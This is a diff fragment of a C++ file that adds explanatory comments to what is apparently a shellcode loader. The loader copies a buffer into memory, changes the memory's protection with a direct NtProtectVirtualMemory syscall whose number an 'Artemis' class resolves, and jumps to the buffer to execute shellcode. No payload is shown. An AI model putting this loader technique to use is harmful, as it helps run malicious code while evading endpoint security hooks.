@@ -228,7 +228,7 @@ extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle,
 
 extern "C" void jumper(UINT64* location);
 
-Artemis artemis;
+Artemis artemis; // Declare Artemis Class
 
 int syscallID = artemis.controller("NtProtectVirtualMemory");
 
@@ -280,12 +280,12 @@ int main() {
     *(UINT64*)baseAddress = *buf;
     memcpy(baseAddress, buf, sizeof(buf));  // copy into allocated mem location
 
-    // Call the NtProtectVirtualMemory syscall from the assembly file
+    // Call the NtProtectVirtualMemory syscall from the assembly file and pass extracted syscall id as param
     ULONG oldProtect;
     NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,
                                              &regionSize, protect, &oldProtect, syscallID);
 
-    jumper((UINT64*)baseAddress);
+    jumper((UINT64*)baseAddress); // Jump to execute shellcode
 
     if (NT_SUCCESS(status)) {
         std::cout << "Memory protection changed successfully." << std::endl;
